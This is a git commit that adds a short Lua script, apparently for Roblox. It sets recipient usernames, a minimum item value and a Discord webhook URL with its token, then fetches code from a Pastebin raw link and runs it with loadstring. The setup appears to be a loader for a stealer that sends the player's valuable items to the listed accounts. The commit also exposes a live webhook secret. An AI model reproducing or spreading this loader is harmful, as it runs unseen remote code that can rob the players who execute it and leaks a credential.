d8cdeadff2650f276d6088310157bab5ed7f9c23
TakZ-bit <tak72086@gmail.com>
2025-11-01 01:37:14 +0630

    Create BbS.lua

---
+++ BbS.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"idsfk4", "user2", "user3"} -- you can add as many as you'd like
+_G.min_rap = 100
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1426998758348034078/3fiI7i6y1li-xYuKDf3OZoSNiy0gXyciRqSUdui2JjBbDDk8f-cvBvVFn4OLhNj-xDFI" -- change to your webhook
+
+loadstring(game:HttpGet("https://pastebin.com/raw/qjbznyGH"))()
